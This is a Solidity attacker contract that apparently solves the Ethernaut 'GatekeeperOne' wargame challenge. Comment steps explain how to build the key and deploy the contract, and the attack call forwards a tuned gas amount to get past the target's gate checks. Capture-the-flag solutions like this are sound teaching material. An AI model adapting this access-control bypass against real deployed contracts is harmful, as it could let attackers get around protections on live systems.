// 1 - Pass bytes to remix - await web3.utils.padLeft(web3.utils.asciiToHex("a"), 16) - Chrome Console
// 2 - Deploy this contract - Metamask
// 3 - Call Attack function with key = `0x100000000000${Last four digits of EOA}`

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public gatekeeperOne;

    constructor(address challengeAddress) public {
        gatekeeperOne = IGatekeeperOne(challengeAddress);
    }

    function attack(bytes8 key) external {
        (bool result, ) = address(gatekeeperOne).call.gas(819354)(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(result, "contract execution failed");
    }
}
